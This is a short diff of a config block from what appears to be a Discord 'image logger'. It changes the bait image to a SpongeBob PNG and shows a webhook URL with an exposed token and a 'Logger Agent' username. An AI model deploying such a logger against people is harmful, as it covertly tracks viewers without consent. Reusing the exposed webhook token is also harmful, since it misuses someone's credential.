@@ -11,7 +11,7 @@ __author__ = "foaqen"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1467553434541625558/fKl1f66ykkbYUxlzxhR-ODuDaskO6bZvEi_Xb7zxeR0MNelnYg3LJBs-ZFCmA2QYDmbK",
-    "image": "https://github.com/CravexGlokkNine/image/blob/main/image.png", 
+    "image": "https://pngimg.com/uploads/spongebob/spongebob_PNG10.png", 
     "imageArgument": True,
 
     "username": "Logger Agent", 
